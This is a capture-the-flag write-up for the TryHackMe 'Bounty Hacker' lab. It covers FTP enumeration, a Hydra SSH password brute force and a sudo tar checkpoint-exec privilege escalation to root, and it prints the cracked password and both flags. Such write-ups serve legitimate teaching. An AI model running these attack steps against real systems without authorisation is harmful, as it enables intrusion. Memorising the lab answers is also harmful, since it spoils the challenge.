# 🏴‍☠️ TryHackMe - Bounty Hacker

**Platform:** TryHackMe  
**Challenge Type:** Boot2Roo  
**Author:** Gage Ayala ([@GageGotya](https://github.com/GageGotya))  
**Date:** April 9, 2025  
**Difficulty:** ⭐ Easy  

---

## 📘 Overview

The **Bounty Hacker** room places you in the role of a digital bounty hunter targeting a cybercriminal syndicate.  
You'll enumerate a server, access files via FTP, crack credentials, and escalate to root using a misconfigured sudo permission.

> 💡 A great beginner-friendly room covering foundational pentesting techniques like recon, password reuse, and privilege escalation.

---

## 🌐 Information Gathering

**Target IP:** _Provided by the room_

### 🔍 Nmap Scan

```bash
nmap -sC -sV <target-ip>
```

**Ports Discovered:**

- `21/tcp` – FTP (vsftpd 3.0.3, anonymous login allowed)  
- `22/tcp` – SSH (OpenSSH 7.2.2)  
- `80/tcp` – HTTP (Apache httpd 2.4.18)

---

## 📂 FTP Access

```bash
ftp <target-ip>
Name: anonymous
```

### 📁 Files Discovered

```bash
ftp> ls
locks.txt
task.txt

ftp> get locks.txt
ftp> get task.txt
```

#### 📄 task.txt

```
1.) Protect Vicious.  
2.) Plan for Red Eye pickup on the moon.  
-lin
```

🔑 **Username hint:** `lin`

#### 📄 locks.txt

Custom password list found which are likely reused credentials.

---

## 🔓 Gaining Access

### 🚀 Brute Force with Hydra

```bash
hydra -l lin -P locks.txt ssh://<target-ip>
```

✅ **Password Found:** `RedDr4gonSynd1cat3`

---

## 🔐 SSH Access

```bash
ssh lin@<target-ip>
```

---

## 🏁 User Flag

```bash
cat ~/Desktop/user.txt
```

**Flag:**  
```
THM{CR1M3_SyNd1C4T3}
```

---

## 🪜 Privilege Escalation

### 🔍 Sudo Permissions

```bash
sudo -l
```

```text
User lin may run the following command as root:
(root) /bin/tar
```

### 📦 Exploiting tar

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

```bash
whoami
root
```

---

## 👑 Root Flag

```bash
cat /root/root.txt
```

**Flag:**  
```
THM{80UN7Y_h4cK3r}
```

---

## 💡 Reflections

- Anonymous FTP access is often overlooked but powerful  
- Password reuse is still a major weakness  
- Always run `sudo -l` — it's a goldmine  
- Even basic tools like `tar` can grant root when misconfigured

---

## 🧠 Pro Tip

> *"When in doubt, poke around, read everything, and always try the simple stuff first."*

---

## 📁 Summary of Key Files

| File        | Description                            |
|-------------|----------------------------------------|
| `locks.txt` | Password list used in brute-force      |
| `task.txt`  | Initial objective + username clue      |
| `user.txt`  | First flag found on user's desktop     |
| `root.txt`  | Root flag retrieved after escalation   |
